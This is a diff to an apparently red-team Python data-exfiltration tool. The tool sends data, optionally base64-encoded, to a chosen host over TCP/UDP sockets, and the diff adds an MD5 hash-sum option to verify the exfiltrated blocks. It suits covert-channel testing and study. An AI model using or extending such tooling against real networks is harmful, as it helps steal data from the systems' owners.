@@ -1,7 +1,7 @@
 #!/usr/bin/python3 -tt
 # (C) 2015 Bernhards 'Lockout' Blumbergs
 # See LICENSE file for usage conditions
-__version__ = "0.63/Bridgette"
+__version__ = "0.7/Camryn"
 
 import socket
 import sys
@@ -11,6 +11,17 @@ import random
 from os import urandom
 from time import sleep, time
 from math import ceil
+from hashlib import md5
+
+
+def hashsum(data):
+    """
+    Calculates the exfiltrated data MD5 hash sum
+    """
+    global hash_sum
+    if data:
+        data_hash = int(md5(data).hexdigest(), 16)
+        hash_sum += data_hash
 
 
 def send64(data, mode):
@@ -58,6 +69,14 @@ def send64(data, mode):
                     version, host, port, args.interface)
                 )
 
+        if args.hashing:                        # Calculate hash before b64
+            hashsum(data)
+            if args.verbose >= 2:
+                print(
+                    "[+] Exfiltrated data block hash sum: {0}".format(
+                        hex(hash_sum))
+                    )
+
         if args.base64:
             data = base64.b64encode(data)
             if args.verbose >= 3:
@@ -104,7 +123,7 @@ def send64(data, mode):
                 socket.SOL_SOCKET,
                 socket.SO_REUSEADDR,
                 1)
-            #sock.bind(('', args.source_port))
+            # sock.bind(('', args.source_port))
 
         if args.verbose >= 1:
             print(
@@ -116,6 +135,14 @@ def send64(data, mode):
         sock.connect((host, port))
         if args.verbose >= 1:
             print("[*] TCP socket connected")
+
+        if args.hashing:                    # Calculate hash before b64
+            hashsum(data)
+            if args.verbose >= 2:
+                print(
+                    "[+] Exfiltrated data block hash sum: {0}".format(
+                        hex(hash_sum))
+                    )
 
         if args.base64:
             data = base64.b64encode(data)
@@ -345,6 +372,11 @@ parser.add_argument(
     " Default: 3")
 
 parser.add_argument(
+    '--hashing',
+    action="store_true",
+    help="calculate exfiltrated data hash sum. Default: False")
+
+parser.add_argument(
     '-V', '--version',
     action="store_true",
     help="Print program version and exit")
@@ -365,6 +397,7 @@ ip4_sessions = 0
 ip6_sessions_total = 0
 ip4_sessions_total = 0
 data_sent = 0
+hash_sum = 0x0
 
 
 # Main routine
@@ -401,6 +434,11 @@ if not args.listen:
                 data_sent,
                 end_time - start_time)
             )
+        if args.hashing:
+            print(
+                "[+] Exfiltrated data hash sum: {0}".format(
+                    hex(hash_sum))
+                )
 
 # Listen mode
 if args.listen:
@@ -449,12 +487,28 @@ if args.listen:
                                 len(data64), data64)
                             )
                     data64 = base64.b64decode(data64)
+                if args.hashing:
+                    hashsum(data64)
+                    if args.verbose >= 2:
+                        print(
+                            "[+] Data block hash sum: {0}".format(
+                                hex(hash_sum))
+                            )
+
                 sys.stdout.buffer.write(data64)
 
             if not data64:
                 break
 
         sock64.close()
+
+        if args.show_stat or args.verbose >= 1:
+            print("[*] SUMMARY:")
+            if args.hashing:
+                print(
+                    "[+] Exfiltrated data hash sum: {0}".format(
+                        hex(hash_sum))
+                    )
 
     if args.tcp:
         sock64 = socket.socket(
@@ -485,6 +539,7 @@ if args.listen:
             if data64:
                 if args.verbose >= 2:
                     print("[+] Received from {0}".format(addr64))
+
                 if args.base64:
                     if args.verbose >= 3:
                         print(
@@ -492,9 +547,25 @@ if args.listen:
                                 len(data64), data64)
                             )
                     data64 = base64.b64decode(data64)
+                if args.hashing:
+                    hashsum(data64)
+                    if args.verbose >= 2:
+                        print(
+                            "[+] Data block hash sum: {0}".format(
+                                hex(hash_sum))
+                            )
+
                 sys.stdout.buffer.write(data64)
 
             if not data64:
                 break
 
         sock64.close()
+
+        if args.show_stat or args.verbose >= 1:
+            print("[*] SUMMARY:")
+            if args.hashing:
+                print(
+                    "[+] Exfiltrated data hash sum: {0}".format(
+                        hex(hash_sum))
+                    )
